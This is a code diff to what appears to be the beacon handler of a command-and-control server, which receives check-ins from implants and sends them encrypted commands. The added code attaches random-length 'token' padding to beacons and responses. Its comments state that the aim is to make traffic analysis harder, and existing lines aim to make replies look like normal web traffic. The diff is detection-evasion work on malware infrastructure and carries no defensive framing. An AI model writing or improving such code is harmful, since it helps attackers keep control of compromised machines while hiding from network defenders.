@@ -4,6 +4,8 @@ import base64
 import re
 import uuid
 import hashlib
+import random
+import string
 
 logger = logging.getLogger(__name__)
 
@@ -35,6 +37,12 @@ class BeaconHandler(BaseHandler):
                 body_data = json.loads(request_body)
                 is_first_contact = body_data.get('first_contact', False)
                 encrypted_data = body_data.get('data')
+                
+                # Extract and discard the padding data (we just need to strip it)
+                # This helps make the traffic more variable in size without affecting functionality
+                token = body_data.get('token', '')
+                if token:
+                    self.log_message(f"Received beacon with {len(token)} bytes of token padding")
                 
                 if not encrypted_data:
                     self.send_error_response(400, "Missing data field")
@@ -209,9 +217,26 @@ class BeaconHandler(BaseHandler):
                 response_data["commands"] = encrypted_commands
                 response_data["encrypted"] = True
             
+            # Add random padding to the response to vary payload size using 'token' field
+            self._add_random_token(response_data)
+            
             # Send the response as JSON
             self.send_response(200, "application/json", json.dumps(response_data))
         else:
             # For regular check-ins with no commands, just send a simple "OK" response
             # This looks more like normal web traffic
             self.send_response(200, "text/plain", "OK")
+    
+    def _add_random_token(self, response_data):
+        """Add random padding to response using 'token' field to make traffic analysis harder"""
+        # Generate a truly random length between 50 and 500 characters
+        padding_length = random.randint(50, 500)
+        
+        # Generate random padding content
+        chars = string.ascii_letters + string.digits
+        padding = ''.join(random.choice(chars) for _ in range(padding_length))
+        
+        # Add padding to response data as 'token' field
+        response_data["token"] = padding
+        
+        logger.debug(f"Added {padding_length} bytes of padding to response token field")
